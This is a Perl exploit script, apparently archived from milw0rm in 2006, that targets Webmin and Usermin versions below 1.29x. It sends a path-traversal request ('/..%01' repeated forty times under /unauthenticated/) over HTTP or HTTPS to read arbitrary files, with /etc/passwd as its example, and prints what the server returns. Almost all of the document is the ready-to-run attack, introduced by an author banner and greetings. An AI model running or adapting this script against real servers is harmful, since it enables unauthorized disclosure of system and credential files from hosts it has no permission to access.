#!/usr/bin/perl
#		Exploit for WEBMIN and USERMIN  less than 1.29x
#		ARBITARY REMOTE FILE DISCLOSURE
#		WORKS FOR HTTP AND HTTPS (NOW)
#		Thrusday 13th  July 2006
#		Vulnerability Disclosure at securitydot.net
#		Coded by UmZ! umz32.dll _at_ gmail.com
#
#
#
#		Make sure you have LWP before using this exploit.
#		USE IT AT YOUR OWN RISK
#
#		GREETS to wiseguy, Anonymous Individual, Uquali......Jhant... Fakhru... etc........................
#		for other.. like AHMED n FAIZ ... (GET A LIFE MAN).



#		Revised on Friday 14th July 2006
use LWP::Simple;
use LWP::UserAgent;
my $userag = LWP::UserAgent->new;

if (@ARGV < 4) {
                    print("Usage: $0 <url> <port> <filename> <target> \n");
                    print("TARGETS are\n ");
		    print("0  - > HTTP \n");
		    print(" 1  - > HTTPS\n");
		    print("Define full path with file name \n");
		    print("Example: ./webmin.pl blah.com 10000 /etc/passwd\n");
		    exit(1);
                    }

                    ($target, $port,$filename, $tar) = @ARGV;

		print("WEBMIN EXPLOIT !!!!! coded by UmZ!\n");
		print("Comments and Suggestions are welcome at umz32.dll [at] gmail.com\n");
		print("Vulnerability disclose at securitydot.net\nI am just coding it in perl 'cuz I hate PHP!\n");
		print("Attacking $target on port $port!\n");
		print("FILENAME:  $filename\n");


		$temp="/..%01" x 40;

		if ($tar == '0')
			{ my $url= "http://". $target. ":" . $port ."/unauthenticated/".$temp . $filename;
			$content=get $url;

			print("\n FILE CONTENT STARTED");
			print("\n -----------------------------------\n");

			print("$content");
			print("\n -------------------------------------\n");
 			}


		elsif ($tar == '1')
			 {
			my $url= "https://". $target. ":" . $port ."/unauthenticated/".$temp . $filename;
			my $req = HTTP::Request->new(GET => $url);
			my $res = $userag->request($req);
  			if ($res->is_success) {
   			   	print("FILE CONTENT STARTED\n");
				print("-------------------------------------------\n");
				print $res->as_string;
  				print("-------------------------------------------\n");
						}
  			else {
      			print "Failed: ", $res->status_line, "\n";
  			     }
			}

# milw0rm.com [2006-07-15]